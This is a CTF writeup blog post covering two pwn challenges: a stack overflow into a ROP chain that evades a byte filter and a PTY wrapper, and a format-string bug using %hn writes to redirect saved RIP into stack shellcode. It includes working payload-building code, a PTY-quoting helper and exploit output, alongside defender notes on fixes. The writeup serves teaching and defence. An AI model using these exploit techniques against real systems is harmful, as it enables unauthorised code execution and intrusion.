---
title: "TraceBash CTF 2026 Pwn Writeup: 2 Challenges Solved"
slug: "tracebash-ctf-2026-pwn-writeup"
description: "TraceBash CTF 2026 pwn track writeup — Banned Bytes badchars ROP with a socat PTY quoting wrinkle, and Legacy Ledger format-string %hn writes redirecting saved RIP into stack shellcode."
date: 2026-06-27T14:30:00Z
lastmod: 2026-08-04T10:00:00Z
draft: false
author: "CyberSecurity Elite Team"
categories: ["CTF Writeups"]
series: ["TraceBash CTF 2026"]
tags:
  - "tracebash ctf"
  - "tracebash ctf 2026"
  - "pwn"
  - "binary exploitation"
  - "badchars rop"
  - "format string vulnerability"
  - "printf %hn write"
  - "executable stack shellcode"
  - "socat pty"
  - "rop chain"
keywords:
  - "tracebash ctf 2026 pwn writeup"
  - "tracebash pwn writeup"
  - "banned bytes writeup"
  - "legacy ledger writeup"
  - "badchars rop chain xor decode"
  - "rop chain forbidden bytes"
  - "socat pty literal next ctrl-v"
  - "format string %hn write saved rip"
  - "z execstack stack shellcode ctf"
  - "stack leak printf positional argument"
  - "tbctf pwn writeup"
  - "ctf pwn step by step"
toc: true
cover:
  image: "/images/articles/tracebash-ctf-2026-pwn-writeup.png"
  alt: "TraceBash CTF 2026 pwn writeup — Banned Bytes badchars ROP and Legacy Ledger format-string %hn writes to stack shellcode"
---

Third post in the **CyberSecurity Elite** TraceBash CTF 2026 pwn series on this site. The earlier ones cover [crypto](/ctf-writeups/tracebash-ctf-2026-crypto-writeup/) (small-subgroup DH, shared RSA prime, harmonic XOR, 16-bit seed brute) and [OSINT](/ctf-writeups/tracebash-ctf-2026-osint-writeup/) (geocaching pivot, Plus Codes, NYC DOB open data, cross-platform handle pivoting). This one walks the two pwn challenges in the same step-by-step format.

**Banned Bytes** is a classic stack overflow into a ROP chain with two interesting wrinkles: a post-overflow byte filter strips `x`, `g`, `a`, `.` from the entire input (and the target filename `flag.txt` contains all four), and the remote service runs the binary behind `socat ... pty,stderr`, so any control byte in the wire payload gets eaten by the PTY's canonical mode line discipline. **Legacy Ledger** is the 446-point headline: a banking program leaks two stack pointers at startup, then passes attacker input to `printf` as the format string, and the binary was compiled with `-z execstack`. Three `%hn` writes redirect main's saved return address into in-buffer shellcode.

Per-challenge READMEs, solver scripts, and the original handouts live at [Abdelkad3r/TraceBash-CTF-2026/pwn](https://github.com/Abdelkad3r/TraceBash-CTF-2026/tree/main/pwn).

## The two pwn challenges

| Challenge | Bug class | Points | Flag |
|---|---|---|---|
| Banned Bytes | Stack BOF → ROP, with a post-overflow filter banning `x`, `g`, `a`, `.` and a PTY remote that interprets control bytes. Encode `flag.txt` with XOR-2, write to `.bss`, decode in memory via `xor byte ptr [r15], r14b` gadgets, call `print_file@plt`. Prefix every control byte on the wire with `Ctrl-V` literal-next. | 100 | `TBCTF{r0p_byp4551ng_ch4r5_4r3_s0_3z}` |
| Legacy Ledger | Stack-leak (`printf("%p, %p\n", &buf, &balance)` at startup) gives `buf_addr` and the saved-RIP offset (`+0x418`). `printf(user_input)` in deposit/withdraw is a format-string bug. Compiled with `-z execstack`. Three `%hn` writes overwrite low 6 bytes of saved RIP with `buf_addr + shell_offset`. Send `exit`; main's epilogue returns into shellcode. | 446 | `TBCTF{b0rg3d-5t@ck}` |

The pattern that connects both: the binary either tells you exactly where it lives (Legacy Ledger's leak) or runs at a fixed non-PIE base with friendly gadgets at fixed addresses (Banned Bytes). The work is in the *primitive shaping*, not in the recon. For Banned Bytes that means turning a write-32-bytes-with-banned-characters into a banned-byte-free in-memory decoder. For Legacy Ledger that means turning a format-string write into a saved-RIP redirect into shellcode. Both attacks are mechanical once the constraints are understood.

## Methodology — leak first, then shape the primitive

A pattern that worked across both pwn challenges: leak the constraints before writing any payload bytes. For Legacy Ledger, the startup leak is literally an `%p, %p` debug print. For Banned Bytes, the leak is the binary itself (non-PIE, all interesting symbols at fixed addresses), the disassembly of the post-read filter loop, and the Dockerfile's `socat ... pty` clause. Every byte in your eventual payload has to survive each of those constraints, so the cheapest move is to enumerate them up front and let the constraints drive the chain design.

For Banned Bytes specifically: the byte filter is the structural constraint, the PTY is the transport constraint, and the badchars-clean gadget set is the toolkit. The ROP design follows from those three. For Legacy Ledger, the executable stack plus the leak plus the format-string write together produce one of the cleanest "leak + write + jump" chains in modern pwn: it's a three-step plan that maps directly onto three `%hn` writes.

Per-challenge walkthroughs follow.

## Banned Bytes

### The setup

A small non-PIE 64-bit Linux binary plus a helper shared library:

```
vuln:        ELF 64-bit LSB executable, dynamically linked, not stripped
libprint.so: ELF 64-bit LSB shared object, dynamically linked, not stripped
```

The library exports exactly one interesting function:

```c
void print_file(char *path)
{
    FILE *fp = fopen(path, "r");
    if (fp != NULL) {
        while ((c = fgetc(fp)) != EOF)
            putchar(c);
        fclose(fp);
    }
}
```

The objective is straightforward: gain control of saved RIP and call `print_file("flag.txt")`.

### Step 1 — Locate the overflow and the filter

The vulnerable function reserves `0x50` bytes of stack and reads up to `0x200`:

```
40116b: sub  rsp, 0x50
...
4011cd: lea  rax, [rbp-0x50]
4011d1: mov  edx, 0x200
4011d6: mov  rsi, rax
4011d9: mov  edi, 0
4011de: call read@plt
```

Saved RIP is at `rbp + 8`, so offset from the start of the buffer is `0x50 + 8 = 88` bytes. Anything you write at byte 88+ overwrites the return address.

After the read, the program walks the entire received buffer and replaces four characters with NUL:

```
cmp byte ptr [rbp-0x9], 0x78   ; 'x'
cmp byte ptr [rbp-0x9], 0x67   ; 'g'
cmp byte ptr [rbp-0x9], 0x61   ; 'a'
cmp byte ptr [rbp-0x9], 0x2e   ; '.'
...
mov byte ptr [rbp+rax-0x50], 0
```

So `x`, `g`, `a`, and `.` cannot appear *anywhere* in the input. Not in the filename, not in gadget addresses, not in any data byte. Each banned byte that lands on the stack gets zeroed before the function returns, which corrupts both the chain and the data.

### Step 2 — Enumerate badchars-clean gadgets

Because the binary is non-PIE, the useful gadgets and symbols all have fixed addresses, and (helpfully) none of those addresses contains a banned byte:

```
0x401060 print_file@plt
0x40125b pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x401264 pop r14 ; pop r15 ; ret
0x401269 mov qword ptr [r13], r12 ; ret
0x40126e xor byte ptr [r15], r14b ; ret
0x401272 pop rdi ; ret
0x401274 ret
0x404060 writebuf
```

The `mov [r13], r12` and `xor [r15], r14b` gadgets are the write and decode primitives. `writebuf` is a writable `.bss` page that's free to use as scratch space. `pop rdi` sets the argument, `print_file@plt` is the destination.

### Step 3 — Encode the banned characters

The filename `flag.txt` contains all four banned bytes (`f`, `l`, **`a`**, **`g`**, **`.`**, `t`, **`x`**, `t`). The simplest encoding is XOR with a single key. With key `0x02`, the four banned characters map to four legal characters:

| Offset | Wanted | Encoded |
|---:|---|---|
| 2 | `a` (0x61) | `c` (0x63) |
| 3 | `g` (0x67) | `e` (0x65) |
| 4 | `.` (0x2e) | `,` (0x2c) |
| 6 | `x` (0x78) | `z` (0x7a) |

The string written into `.bss` is `flce,tzt`. After four XOR-2 operations targeted at offsets 2, 3, 4, and 6, the same memory reads as `flag.txt`. The chain runs the XOR with `r14b = 2` and `r15 = writebuf + offset`.

### Step 4 — Build the ROP chain

```python
payload  = b"A" * 88

# write "flce,tzt" to writebuf (one qword)
payload += p64(POP_R12_R13_R14_R15)
payload += p64(int.from_bytes(b"flce,tzt", "little"))
payload += p64(WRITEBUF)
payload += p64(0)
payload += p64(0)
payload += p64(MOV_QWORD_PTR_R13_R12)

# decode offsets 2, 3, 4, 6 with XOR key 2
for offset in (2, 3, 4, 6):
    payload += p64(POP_R14_R15)
    payload += p64(2)
    payload += p64(WRITEBUF + offset)
    payload += p64(XOR_BYTE_PTR_R15_R14B)

# print_file(writebuf)
payload += p64(POP_RDI)
payload += p64(WRITEBUF)
payload += p64(RET)                  # 16-byte stack alignment for the library call
payload += p64(PRINT_FILE_PLT)
payload += p64(MAIN)                 # re-enter main so the flag prints before the process dies
```

The extra `ret` before `print_file@plt` keeps the stack 16-byte aligned at the call site, which matters because some libc functions assume aligned `xmm` access. The final raw payload is 304 bytes and contains none of the four banned bytes.

### Step 5 — Survive the PTY remote

Sending the raw payload to a local binary works immediately:

```bash
python3 solve.py --payload | \
  docker run --rm -i -v "$PWD:/w" -w /w debian:bookworm \
  bash -lc 'LD_LIBRARY_PATH=. ./vuln'
```

The remote is wrapped in `socat`:

```dockerfile
CMD ["socat", "TCP-LISTEN:1338,reuseaddr,fork", "EXEC:/home/ctf/run.sh,pty,stderr"]
```

The `pty` option attaches a pseudo-terminal between the socket and the binary's stdin. PTYs default to canonical mode, where the line discipline interprets certain control bytes (`Ctrl-C`, `Ctrl-R`, `Ctrl-D`, etc.) before passing the rest to the program. Gadget addresses like `0x40125b` contain `0x12` (which is `Ctrl-R`, the bash reverse-search trigger), and the chain is full of `0x00` and other low bytes. Sent raw, the PTY mangles the payload before the binary ever sees it.

The fix is the terminal line discipline's *literal-next* character, `Ctrl-V` (`0x16`). Prefixing any control byte with `0x16` tells the line discipline "next byte is data, don't interpret it." The solver wraps the wire payload with:

```python
def pty_quote(data):
    special = set(range(0x00, 0x20)) | {0x7F}
    quoted = bytearray()
    for byte in data:
        if byte in special and byte not in (0x0A, 0x0D):
            quoted.append(0x16)
        quoted.append(byte)
    return bytes(quoted)
```

This leaves the raw payload's bytes intact from the binary's perspective and lets the wire bytes pass cleanly through the PTY.

### Step 6 — Fire

```bash
python3 solve.py 13.127.119.28 1338
```

Output:

```
You entered: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
TBCTF{r0p_byp4551ng_ch4r5_4r3_s0_3z}
```

### Why Banned Bytes works

The bug stack is layered. The base bug is the oversized `read` into a fixed-size stack buffer. The byte filter and the PTY wrapper are mitigations that look like they make exploitation harder, but neither is meaningful in isolation.

The byte filter only corrupts the four named characters after the overflow has already happened. Once an attacker has write and byte-mutation gadgets, forbidden strings can be reconstructed in memory after the filter runs. The robust fix is to bound the `read` to the buffer size and to avoid exposing a file-printing helper that takes an attacker-controlled path. Stack canaries (which the binary lacks) would catch the overwrite. PIE would force a leak before any gadget could be referenced. Either of those mitigations would close the chain.

The PTY trap is an operational gotcha specific to `socat` PTY wrappers in CTF infrastructure. It's not a security boundary on a real service, but it's worth knowing about because the same primitive (canonical-mode line discipline) can either mangle your exploit silently or trim your input in subtle ways (line buffering, `Ctrl-D` EOF, `Ctrl-W` word-erase). On any pwn challenge whose remote runs behind a PTY, `Ctrl-V` quoting is the standard prophylactic.

## Legacy Ledger

The 446-point headline. A small 64-bit Linux banking program with a menu (`view balance | deposit | withdraw | transfer | exit`). The handout includes the Dockerfile, which immediately surfaces the two most useful build flags:

```dockerfile
RUN gcc -o /app/run -z execstack -Wno-format-security /app/chall.c
```

`-Wno-format-security` is a strong hint that there's a format-string bug somewhere. `-z execstack` says the stack is executable, which makes "leak + write + jump" trivially viable.

### Step 1 — Catch the startup leak

The binary prints two pointers before showing the menu:

```
0x7fff1e4561e0, 0x7fff1e4561cc
Welcome to Bash Bank!
What would you like to do? (view balance|deposit|withdraw|transfer|exit)
```

Disassembly shows the values:

```asm
lea    rdx, [rbp-0x424]      ; &balance
lea    rax, [rbp-0x410]      ; input buffer
mov    rsi, rax
mov    rdi, "%p, %p\n"
call   printf
```

So the first leak is `&buffer` (`rbp - 0x410`) and the second is `&balance` (`rbp - 0x424`). Saved RIP sits at `rbp + 8`, which is:

```
saved_rip = leaked_buffer + 0x418
```

That single leak gives you everything you need to aim writes at the saved return address with no ASLR guessing.

### Step 2 — Find the format-string bug

The menu dispatcher routes `deposit` and `withdraw` to handlers that read the amount into the input buffer and then pass that buffer directly to `printf` as the format string:

```asm
; deposit path
lea    rdi, [rbp-0x410]
call   fgets
lea    rdi, [rbp-0x410]
mov    eax, 0
call   printf              ; printf(user_input)
```

Classic format-string vulnerability. Because the input buffer itself is on the stack, anything you place in the buffer after the format string can be read as a positional argument.

One small parsing detail: the menu strings in `.rodata` include the trailing newline (`deposit\n`, `exit\n`, etc.). Normal menu commands work as typed. Only the amount field needs a crafted binary payload.

### Step 3 — Find the positional argument offset

Send a marker through the deposit prompt and walk the positional arguments:

```
AAAA.%1$p.%2$p.%3$p...
```

The first qword of the input buffer appears as positional argument **12** in this build:

```
%12$p -> 0x2431252e41414141
```

That's `"AAAA.%$1"` little-endian, which confirms the buffer's offset on the stack and the argument index.

The format string itself lives inside the buffer, so any pointers you want to write to have to be placed *after* a NUL byte. `printf` stops parsing the format string at the first NUL, but the bytes after the NUL remain on the stack and are still reachable via the positional arguments that come after offset 12.

### Step 4 — Verify the write primitive

As a sanity check, target the balance variable with a `%hn` (write the count-so-far into a 16-bit slot):

```python
target = leaked_balance
payload = b"%4660c%14$hn" + b"\x00" + padding + p64(target)
```

After the deposit, `view balance` prints:

```
Your balance is $4660
```

The `%hn` write landed at the target address. The write primitive is reliable.

### Step 5 — Plan the saved-RIP overwrite

Three observations make the plan clean:

- Modern x86-64 canonical user-space addresses have the top two bytes zero. So the saved RIP only needs three 16-bit writes (the low 48 bits); the high 16 bits can stay zero.
- The shellcode lives later in the same input buffer. Its address is `buf_addr + shellcode_offset`, both of which are known.
- The format-string write can target three consecutive 2-byte slots inside the saved RIP by writing to `saved_rip + 0`, `saved_rip + 2`, and `saved_rip + 4`.

The solver computes:

```python
saved_rip  = buf_addr + 0x418
shell_addr = buf_addr + shell_off

chunks = [
    shell_addr & 0xffff,
    (shell_addr >> 16) & 0xffff,
    (shell_addr >> 32) & 0xffff,
]
targets = [saved_rip, saved_rip + 2, saved_rip + 4]
```

Three halfword writes are enough to replace the saved return address with a stack address inside the shellcode region.

### Step 6 — Build the full amount-buffer payload

The buffer layout is:

```
[format string][NUL][alignment padding][saved-RIP targets][NOP sled][shellcode]
```

The format string uses `%hn` with the right `%c` counts to write the three chunks in sequence. The payload builder iterates the format-string length until the positional argument indexes line up with the aligned saved-RIP-target slots. On the remote, this stabilises at indexes 17, 18, and 19:

```
format-string arguments:
  17 -> saved RIP + 0 (low 16 bits of shell_addr)
  18 -> saved RIP + 2 (mid 16 bits)
  19 -> saved RIP + 4 (high 16 bits of the 48-bit shell_addr)
```

The shellcode is a standard null-free `execve("/bin//sh", NULL, NULL)` payload (`/bin//sh` because the double-slash avoids a NUL byte when split into a qword and pushed). A small NOP sled before the shellcode gives the targeting some slack so the exact landing offset doesn't need to be byte-perfect.

### Step 7 — Trigger and read

After the format-string write lands, the menu loops back. Sending the `exit` command:

```
exit\n
```

triggers `main`'s epilogue, which pops the (now-overwritten) saved RIP and `ret`s. Execution lands on the NOP sled and slides into the `execve` shellcode. A `/bin/sh` is now spawned on the remote process's stdin/stdout, and the solver pipes:

```bash
cat /app/flag.txt
```

through the spawned shell. Output:

```
TBCTF{b0rg3d-5t@ck}
```

### Why Legacy Ledger works

Three mitigations were either missing or disabled, and each missing one was load-bearing:

- **`-Wno-format-security` and `printf(user_input)`** is the entry. `-Wformat-security` would have flagged the `printf(amount_buffer)` call at compile time; the build script explicitly disabled the warning.
- **`-z execstack`** makes the leak-and-write attack trivial. With a non-executable stack the same `%hn` writes would need to point at libc / GOT / `system()` instead, which is solvable but adds a dozen more lines of solver glue.
- **Startup leak via `printf("%p, %p\n", &buf, &balance)`** is the kind of debug print that should never reach production. Without it, the attacker would need a separate leak primitive (the format-string bug provides one via `%p`, but having it for free in the banner means no extra round-trip).

Each one of those three is the immediate fix. Compile with `-Wformat-security` and `printf("%s", amount)` directly. Drop `-z execstack` (the compiler default is `-z noexecstack` on modern toolchains). Remove the debug leak before shipping. Any single one of those changes turns the exploit from "five minutes once you've read the binary" into "weeks of work with an uncertain outcome."

## Cross-cutting defender notes

Three patterns recur across the TraceBash pwn track and travel directly into production code review.

**Bound the read, don't filter it.** Banned Bytes' post-overflow byte filter is a textbook example of *defence in shape that doesn't actually defend*. The overflow happens before the filter runs, and the filter only mutates four specific characters in the input. An attacker with write and mutation gadgets reconstructs whatever string they want in memory after the filter is done. The right fix is to size the `read` to the buffer (`read(0, buf, sizeof(buf))`) so the overflow never happens in the first place. Mitigations after the bug are weaker than mitigations that prevent the bug.

**Format-string bugs are always exploitable when the format string is on the stack.** `printf(user_input)` is a write primitive if the format string lives in any stack frame the format-string parser can reach via positional arguments. The bug class has been documented since 1999 and `-Wformat-security` has existed in GCC since 2002. Any modern build pipeline that disables `-Wformat-security` is shipping a known vulnerability class. The fix is one line of code (always `printf("%s", buf)` for untrusted `buf`) and one CI guard.

**Executable stacks are a compile-time choice, not an OS default.** Modern Linux toolchains default to non-executable stacks; the compiler emits a `.note.GNU-stack` section that marks the stack as non-executable, and the kernel honours it. `-z execstack` explicitly opts in to an executable stack. Any binary built with that flag is shipping a 1990s threat model in 2026. Review pipelines should refuse PRs that introduce `-z execstack` outside of very specific niche cases (some legacy debuggers, some JIT runtimes that haven't been ported off the stack), and even those niche cases should be allocating writable+executable pages out of `mmap` rather than running off the main thread's stack.

## Frequently asked questions

### What is TraceBash CTF?

TraceBash CTF is a Jeopardy-style CTF whose 2026 edition shipped challenges across cryptography, web, reverse, forensics, pwn, misc, and OSINT. This writeup covers the two pwn challenges. The flag prefix is `TBCTF{...}`. Per-challenge READMEs and solver scripts live at [Abdelkad3r/TraceBash-CTF-2026](https://github.com/Abdelkad3r/TraceBash-CTF-2026).

### What's the bug in Banned Bytes?

A vulnerable function reads up to `0x200` bytes into a `0x50`-byte stack buffer, overflowing the saved RIP at offset 88. The mitigation that looks defensive is a post-read filter that strips `x`, `g`, `a`, `.` from the input. The robust attack is a ROP chain that uses badchars-clean gadgets to write an XOR-encoded copy of `flag.txt` into the `.bss`, decode the four banned bytes in memory with `xor byte ptr [r15], r14b` gadgets, then call `print_file@plt` with the `.bss` address.

### Why are `x`, `g`, `a`, `.` banned in Banned Bytes?

The author wanted to make `flag.txt` unrepresentable in the input. The filename contains all four banned bytes: `f`, `l`, **a**, **g**, **.**, `t`, **x**, `t`. Without encoding, you can't put the filename into memory anywhere because each banned byte gets zeroed during the post-read filter loop. The XOR-2 encoding moves each banned byte off the banned set (`a→c`, `g→e`, `.→,`, `x→z`), and four in-memory `xor [r15], 2` operations restore the original bytes after the filter has already finished running.

### What's the PTY trap in Banned Bytes?

The remote runs the binary behind `socat ... pty,stderr`, which attaches a pseudo-terminal between the socket and the binary's stdin. PTYs default to canonical mode, where the line discipline interprets control bytes (Ctrl-R, Ctrl-D, Ctrl-V, etc.) before passing input to the program. ROP chain bytes like `0x12` (Ctrl-R) and `0x00` get eaten or interpreted as terminal commands. The fix is to prefix every control byte (anything in `[0x00, 0x20)` or `0x7F`, except `\n` and `\r`) with `0x16` (Ctrl-V, the literal-next character). The PTY consumes the quote byte and passes the next byte through to the program unchanged.

### What's the bug in Legacy Ledger?

A 64-bit banking program leaks two stack pointers at startup via `printf("%p, %p\n", &buf, &balance)`. The leak reveals the buffer's address, from which saved RIP is `buf + 0x418`. The deposit and withdraw handlers pass the user-supplied amount directly to `printf` as the format string. That's a textbook format-string write primitive. The binary is also compiled with `-z execstack`, so the stack is executable. Three `%hn` writes overwrite the low 48 bits of saved RIP with `buf_addr + shellcode_offset`. Sending `exit` triggers main's epilogue, which returns into the in-buffer shellcode.

### Why three `%hn` writes instead of one `%n`?

A `%n` write would overwrite a full 32-bit word, which means writing the same `%n` count to two adjacent 32-bit slots. With `%hn` (16-bit write), each write targets exactly two bytes and the counts can be different per write. On x86-64 canonical user-space addresses, the top two bytes are zero, so the high 16-bit slot of saved RIP doesn't need to be overwritten. Three 16-bit writes cover the low 48 bits, which is all that matters.

### How does the format-string write reach the saved RIP?

The format string itself sits in the same buffer as everything else. The `printf` parser stops at the first NUL, but the bytes after the NUL stay on the stack and are reachable through positional arguments past the format-string region. By placing the target addresses (`saved_rip + 0`, `+2`, `+4`) after a NUL and computing the right `%c` widths to make each `%hn` write the correct value, the solver targets the saved RIP slot directly. The positional argument indexes (17, 18, 19 in this build) line up with the aligned target slot via length tuning on the format string.

### Why does `-z execstack` matter?

Modern Linux toolchains default to non-executable stacks via the `.note.GNU-stack` ELF marker. `-z execstack` overrides that default and marks the stack as RWX. With an executable stack, an attacker who controls the saved RIP can simply point it at shellcode they planted in the same stack frame. Without it, the same exploit needs to chain into libc gadgets or ret2system, which adds significant solver complexity. The challenge author enabled `-z execstack` to keep the attack focused on the format-string primitive.

### How do you avoid these bugs in production C?

For format-string bugs: always call `printf` family functions with a literal format string. `printf("%s", buf)` instead of `printf(buf)`. Compile with `-Wformat -Wformat-security` and treat warnings as errors. For stack overflows: bound the read to the buffer (`read(0, buf, sizeof(buf))` not `read(0, buf, 0x200)`). For executable stacks: don't pass `-z execstack`; the default `-z noexecstack` on modern toolchains is correct. For debug leaks: review any `printf("%p")` in production code paths and remove it.

### Where can I find the solver scripts?

Per-challenge READMEs and complete Python solvers live at [Abdelkad3r/TraceBash-CTF-2026/pwn](https://github.com/Abdelkad3r/TraceBash-CTF-2026/tree/main/pwn). Banned Bytes' `solve.py` includes the badchars-clean ROP builder and the PTY literal-next quoter. Legacy Ledger's `solve.py` includes the startup-leak parser, the format-string payload tuner (iterates the format string until positional argument indexes align), the shellcode embedder, and the post-exit shell-interaction loop.

### What's the broader lesson from the TraceBash pwn track?

Two distinct categories of bug, but the same shape of attack design. Banned Bytes: turn write+mutation gadgets into a banned-byte-free decoder. Legacy Ledger: turn a format-string write into a saved-RIP redirect into shellcode. Both attacks are mechanical once the constraints are mapped. The skill is enumerating the constraints (banned bytes, PTY transport, leak content, build flags) before writing any payload, then designing the chain around them rather than fighting them.

## Closing notes

Two challenges, two different shapes of pwn. Banned Bytes at 100 points teaches "design the chain around your filter constraints, and watch the transport." Legacy Ledger at 446 points teaches "format-string + executable stack + startup leak = three `%hn` writes to a shell." Both are short, mechanical solves once you understand the constraints.

For more pwn writeups on this site, the [Anti-Slop CTF 2026 pwn writeup](/ctf-writeups/anti-slopctf-2026-pwn-writeup/) covers three pwn chains (a Bellcore CRT fault against an RSA-FDH signer, a leak-and-overwrite via signed VIEW back-references plus a SYMS-over-plan-object overwrite, and a five-stage VM-overflow-to-GCM-forge chain). The [GPN CTF 2026 master writeup](/ctf-writeups/gpn-ctf-2026-writeup/) covers `recipe-for-disaster`, a `gets()` overflow into an adjacent `int price` that the success check reads as negative. Full [CTF writeups index](/ctf-writeups/) for everything else.

<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "FAQPage",
  "mainEntity": [
    {"@type": "Question","name": "What is TraceBash CTF?","acceptedAnswer": {"@type": "Answer","text": "TraceBash CTF is a Jeopardy-style CTF whose 2026 edition shipped challenges across cryptography, web, reverse, forensics, pwn, misc, and OSINT. This writeup covers the two pwn challenges. The flag prefix is TBCTF{...}. Per-challenge READMEs and solver scripts live at github.com/Abdelkad3r/TraceBash-CTF-2026."}},
    {"@type": "Question","name": "What's the bug in Banned Bytes?","acceptedAnswer": {"@type": "Answer","text": "A vulnerable function reads up to 0x200 bytes into a 0x50-byte stack buffer, overflowing saved RIP at offset 88. A post-read filter strips x, g, a, . from the input. The attack is a badchars-clean ROP chain that writes an XOR-encoded copy of flag.txt to .bss, decodes the four banned bytes in memory with xor byte ptr [r15], r14b gadgets, then calls print_file@plt with the .bss address."}},
    {"@type": "Question","name": "Why are x, g, a, . banned in Banned Bytes?","acceptedAnswer": {"@type": "Answer","text": "The filename flag.txt contains all four banned bytes (a, g, ., x). Without encoding, the filename can't be placed in memory because each banned byte gets zeroed by the post-read filter. XOR-2 encoding moves each banned byte off the banned set (a→c, g→e, .→,, x→z), and four in-memory xor [r15], 2 operations restore the original bytes after the filter has finished running."}},
    {"@type": "Question","name": "What's the PTY trap in Banned Bytes?","acceptedAnswer": {"@type": "Answer","text": "The remote runs the binary behind socat ... pty,stderr, which attaches a pseudo-terminal in canonical mode. The line discipline interprets control bytes (Ctrl-R, Ctrl-D, etc.) before passing input. ROP chain bytes like 0x12 (Ctrl-R) and 0x00 get eaten. Fix: prefix every control byte (00-1F or 7F, except \\n/\\r) with 0x16 (Ctrl-V, literal-next). The PTY consumes the quote byte and passes the next byte through unchanged."}},
    {"@type": "Question","name": "What's the bug in Legacy Ledger?","acceptedAnswer": {"@type": "Answer","text": "A 64-bit banking program leaks two stack pointers at startup via printf(\"%p, %p\\n\", &buf, &balance). Saved RIP is buf + 0x418. The deposit/withdraw handlers pass the user-supplied amount directly to printf as the format string. The binary is compiled with -z execstack. Three %hn writes overwrite the low 48 bits of saved RIP with buf_addr + shellcode_offset; exit triggers main's epilogue and returns into the in-buffer shellcode."}},
    {"@type": "Question","name": "Why three %hn writes instead of one %n?","acceptedAnswer": {"@type": "Answer","text": "%n writes 32 bits; %hn writes 16. On x86-64 canonical user-space addresses, the top 16 bits are zero, so only the low 48 bits of saved RIP need overwriting. Three 16-bit writes target saved_rip+0, +2, +4, each with its own %c count. Using %n would require chaining two writes per 32-bit slot or accepting collateral damage."}},
    {"@type": "Question","name": "How does the format-string write reach the saved RIP?","acceptedAnswer": {"@type": "Answer","text": "The format string sits in the same buffer as everything else. printf stops parsing at the first NUL but the bytes after the NUL stay on the stack and are reachable via positional arguments past the format-string region. Placing target addresses (saved_rip+0/+2/+4) after a NUL and tuning %c widths produces correct %hn writes. The positional argument indexes (17, 18, 19) align via length tuning."}},
    {"@type": "Question","name": "Why does -z execstack matter?","acceptedAnswer": {"@type": "Answer","text": "Modern Linux toolchains default to non-executable stacks via the .note.GNU-stack ELF marker. -z execstack overrides that default and marks the stack RWX. With an executable stack, an attacker who controls saved RIP can point at shellcode planted in the same stack frame. Without it, the same exploit needs libc gadgets or ret2system, adding significant solver complexity."}},
    {"@type": "Question","name": "How do you avoid these bugs in production C?","acceptedAnswer": {"@type": "Answer","text": "Format-string: always call printf family with a literal format. printf(\"%s\", buf) not printf(buf). Compile with -Wformat -Wformat-security and treat warnings as errors. Stack overflows: bound the read to the buffer (read(0, buf, sizeof(buf))). Executable stacks: don't pass -z execstack; the default -z noexecstack is correct. Debug leaks: remove any printf(\"%p\") from production paths."}},
    {"@type": "Question","name": "Where can I find the solver scripts?","acceptedAnswer": {"@type": "Answer","text": "Per-challenge READMEs and complete Python solvers at github.com/Abdelkad3r/TraceBash-CTF-2026/tree/main/pwn. Banned Bytes' solve.py includes the badchars-clean ROP builder and the PTY literal-next quoter. Legacy Ledger's solve.py includes the startup-leak parser, the format-string payload tuner, the shellcode embedder, and the post-exit shell-interaction loop."}},
    {"@type": "Question","name": "What's the broader lesson from the TraceBash pwn track?","acceptedAnswer": {"@type": "Answer","text": "Two categories of bug, same shape of attack design. Banned Bytes: turn write+mutation gadgets into a badchars-clean decoder. Legacy Ledger: turn a format-string write into a saved-RIP redirect into shellcode. Both attacks are mechanical once the constraints are mapped. The skill is enumerating constraints (banned bytes, PTY transport, leak content, build flags) before writing any payload, then designing the chain around them."}}
  ]
}
</script>
